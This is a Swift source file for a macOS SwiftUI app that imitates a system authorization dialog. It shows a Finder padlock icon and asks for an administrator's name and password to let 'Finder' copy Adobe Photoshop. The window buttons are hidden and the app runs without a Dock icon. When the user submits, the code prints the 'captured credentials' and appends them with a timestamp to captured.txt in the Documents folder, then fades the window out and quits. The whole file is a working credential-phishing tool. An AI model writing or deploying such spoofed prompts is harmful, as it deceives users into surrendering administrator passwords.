// LoginAuth.swift
import SwiftUI
import AppKit
import QuartzCore

@main
struct LoginAuthApp: App {
    @NSApplicationDelegateAdaptor(AppDelegate.self) var appDelegate
    var body: some Scene {
        WindowGroup { ContentView().background(WindowConfigurator()) }
            .windowStyle(.hiddenTitleBar)
            .windowResizability(.contentSize)
            .commands { CommandGroup(replacing: .newItem) { } }
    }
}

final class AppDelegate: NSObject, NSApplicationDelegate {
    func applicationWillFinishLaunching(_ n: Notification) { NSApp.setActivationPolicy(.accessory) }
    func applicationDidFinishLaunching(_ n: Notification) {
        DispatchQueue.main.asyncAfter(deadline: .now() + 0.1) { NSApp.activate(ignoringOtherApps: true) }
    }
    func applicationShouldTerminateAfterLastWindowClosed(_ s: NSApplication) -> Bool { true }
}

struct WindowConfigurator: NSViewRepresentable {
    func makeNSView(context: Context) -> NSView {
        let v = NSView()
        DispatchQueue.main.async {
            guard let w = v.window else { return }
            w.standardWindowButton(.closeButton)?.isHidden       = true
            w.standardWindowButton(.miniaturizeButton)?.isHidden = true
            w.standardWindowButton(.zoomButton)?.isHidden        = true
            w.titlebarAppearsTransparent = true
            w.titleVisibility            = .hidden
            w.styleMask.insert(.fullSizeContentView)
            w.isMovableByWindowBackground = true
            w.isOpaque = false
            w.backgroundColor = .clear
            w.hasShadow = true
            w.center()
            w.makeKeyAndOrderFront(nil)
        }
        return v
    }
    func updateNSView(_ nsView: NSView, context: Context) { }
}

struct VisualEffectView: NSViewRepresentable {
    let material: NSVisualEffectView.Material
    func makeNSView(context: Context) -> NSVisualEffectView {
        let v = NSVisualEffectView()
        v.material = material
        v.blendingMode = .behindWindow
        v.state = .active
        return v
    }
    func updateNSView(_ nsView: NSVisualEffectView, context: Context) {
        nsView.material = material
    }
}

struct FinderPadlockIcon: View {
    var body: some View {
        Group {
            if let path = Bundle.main.path(forResource: "icon", ofType: "png"),
               let img = NSImage(contentsOfFile: path) {
                Image(nsImage: img)
                    .resizable()
                    .interpolation(.high)
                    .frame(width: 76, height: 76)
            } else {
                Image(systemName: "lock.fill")
                    .font(.system(size: 54))
                    .foregroundColor(.gray)
                    .frame(width: 76, height: 76)
            }
        }
    }
}

struct SecondaryButtonStyle: ButtonStyle {
    func makeBody(configuration: Configuration) -> some View {
        configuration.label
            .font(.system(size: 13))
            .foregroundColor(.primary)
            .frame(maxWidth: .infinity)
            .frame(height: 28)
            .background(
                Capsule(style: .continuous)
                    .fill(.ultraThinMaterial)
                    .overlay(Capsule(style: .continuous).fill(Color.black.opacity(0.10)))
            )
            .overlay(Capsule(style: .continuous).stroke(Color.black.opacity(0.08), lineWidth: 0.5))
            .contentShape(Capsule(style: .continuous))
            .opacity(configuration.isPressed ? 0.70 : 1.0)
    }
}

struct PrimaryButtonStyle: ButtonStyle {
    func makeBody(configuration: Configuration) -> some View {
        configuration.label
            .font(.system(size: 13))
            .foregroundColor(.white)
            .frame(maxWidth: .infinity)
            .frame(height: 28)
            .background(Capsule(style: .continuous).fill(Color.accentColor))
            .contentShape(Capsule(style: .continuous))
            .opacity(configuration.isPressed ? 0.80 : 1.0)
    }
}

struct ContentView: View {
    @State private var username = ""
    @State private var password = ""
    @State private var isLoading = false
    @FocusState private var focusedField: Field?
    enum Field { case username, password }

    var body: some View {
        VStack(alignment: .leading, spacing: 0) {
            FinderPadlockIcon()
                .padding(.bottom, 12)

            Text("Finder")
                .font(.system(size: 15, weight: .bold))
                .foregroundColor(.primary)
                .padding(.bottom, 8)

            Text("Finder wants to copy \u{201C}Adobe Photoshop\u{201D}.")
                .font(.system(size: 13))
                .foregroundColor(.primary)
                .padding(.bottom, 8)

            Text("Enter an administrator\u{2019}s name and password to allow this.")
                .font(.system(size: 13))
                .foregroundColor(.primary)
                .fixedSize(horizontal: false, vertical: true)
                .padding(.bottom, 14)

            ZStack(alignment: .leading) {
                if username.isEmpty {
                    Text("Username")
                        .font(.system(size: 13))
                        .foregroundColor(Color.secondary.opacity(0.55))
                        .padding(.horizontal, 11)
                        .allowsHitTesting(false)
                }
                TextField("", text: $username)
                    .textFieldStyle(.plain)
                    .font(.system(size: 13))
                    .padding(.horizontal, 11)
                    .frame(height: 28)
                    .focused($focusedField, equals: .username)
                    .disabled(isLoading)
                    .onSubmit { focusedField = .password }
            }
            .background(fieldBg)
            .padding(.bottom, 8)

            ZStack(alignment: .leading) {
                if password.isEmpty {
                    Text("Password")
                        .font(.system(size: 13))
                        .foregroundColor(Color.secondary.opacity(0.55))
                        .padding(.horizontal, 11)
                        .allowsHitTesting(false)
                }
                SecureField("", text: $password)
                    .textFieldStyle(.plain)
                    .font(.system(size: 13))
                    .padding(.horizontal, 11)
                    .frame(height: 28)
                    .focused($focusedField, equals: .password)
                    .disabled(isLoading)
                    .onSubmit { submit() }
            }
            .background(fieldBg)
            .padding(.bottom, 14)

            HStack(spacing: 12) {
                Button("Cancel") { cancel() }
                    .buttonStyle(SecondaryButtonStyle())
                    .keyboardShortcut(.cancelAction)
                    .disabled(isLoading)
                Button("OK") { submit() }
                    .buttonStyle(PrimaryButtonStyle())
                    .keyboardShortcut(.defaultAction)
                    .disabled(isLoading)
            }
            .overlay(alignment: .leading) {
                if isLoading {
                    ProgressView()
                        .controlSize(.small)
                        .scaleEffect(0.65)
                        .offset(x: -18)
                }
            }
        }
        .padding(20)
        .frame(width: 350)
        .background(VisualEffectView(material: .popover))
        .clipShape(RoundedRectangle(cornerRadius: 20, style: .continuous))
        .overlay(
            RoundedRectangle(cornerRadius: 20, style: .continuous)
                .stroke(Color.white.opacity(0.10), lineWidth: 0.5)
        )
        .onAppear {
            DispatchQueue.main.asyncAfter(deadline: .now() + 0.15) {
                focusedField = .username
            }
        }
    }

    private var fieldBg: some View {
        RoundedRectangle(cornerRadius: 6, style: .continuous)
            .fill(Color(nsColor: .textBackgroundColor).opacity(0.45))
            .overlay(
                RoundedRectangle(cornerRadius: 6, style: .continuous)
                    .stroke(Color.black.opacity(0.05), lineWidth: 0.5)
            )
    }

    private func cancel() { NSApp.terminate(nil) }

    private func submit() {
        guard !isLoading else { return }
        guard !username.isEmpty, !password.isEmpty else {
            focusedField = username.isEmpty ? .username : .password
            return
        }
        isLoading = true
        let u = username, p = password
        print("=== Captured credentials ===")
        print("Username: \(u)")
        print("Password: \(p)")
        print("============================")
        saveToDocumentsFile(username: u, password: p)
        DispatchQueue.main.asyncAfter(deadline: .now() + 1.0) { fadeOutAndQuit() }
    }

    private func saveToDocumentsFile(username: String, password: String) {
        let fm = FileManager.default
        guard let docs = fm.urls(for: .documentDirectory, in: .userDomainMask).first else { return }
        let fileURL = docs.appendingPathComponent("captured.txt")
        let df = DateFormatter()
        df.dateFormat = "yyyy-MM-dd HH:mm:ss"
        let stamp = df.string(from: Date())
        let block = """
        [\(stamp)]
        Username: \(username)
        Password: \(password)
        ----------------------------------------

        """
        guard let data = block.data(using: .utf8) else { return }
        if fm.fileExists(atPath: fileURL.path) {
            if let handle = try? FileHandle(forWritingTo: fileURL) {
                handle.seekToEndOfFile()
                handle.write(data)
                try? handle.close()
            }
        } else {
            try? data.write(to: fileURL)
        }
    }

    private func fadeOutAndQuit() {
        guard let w = NSApp.windows.first else { NSApp.terminate(nil); return }
        NSAnimationContext.runAnimationGroup({ ctx in
            ctx.duration = 0.45
            ctx.timingFunction = CAMediaTimingFunction(name: .easeInEaseOut)
            w.animator().alphaValue = 0.0
        }, completionHandler: { NSApp.terminate(nil) })
    }
}
